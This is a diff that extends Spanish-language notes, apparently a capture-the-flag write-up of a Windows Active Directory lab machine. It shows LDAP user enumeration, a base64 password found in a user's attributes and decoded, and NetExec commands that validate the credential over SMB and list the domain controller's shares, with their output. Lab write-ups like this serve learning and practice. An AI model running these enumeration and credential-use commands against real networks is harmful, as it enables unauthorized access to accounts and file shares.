@@ -89,3 +89,32 @@ Buscar usuarios
 ldapsearch -x -H ldap://10.129.9.250 -b "DC=cascade,DC=local" | grep -i userprincipalname
 ```
 
+En el usuario `r.thompson` encontramos una credencial en `bse64`
+Obteniendo las credenciales de este usuario.
+Las validaremos 
+```shell
+nxc smb 10.129.9.250 -u 'r.thompson' -p 'rY4n5eva'
+```
+
+```ad-hint
+r.thompson::rY4n5eva
+```
+
+Enumeraremos los recursos compartidos
+```shell
+nxc smb 10.129.9.250 -u 'r.thompson' -p 'rY4n5eva' --shares
+```
+
+```shell
+Share           Permissions     Remark
+-----           -----------     ------
+ADMIN$                          Remote Admin
+Audit$                          
+C$                              Default share
+Data            READ            
+IPC$                            Remote IPC
+NETLOGON        READ            Logon server share 
+print$          READ            Printer Drivers
+SYSVOL          READ            Logon server share 
+```
+
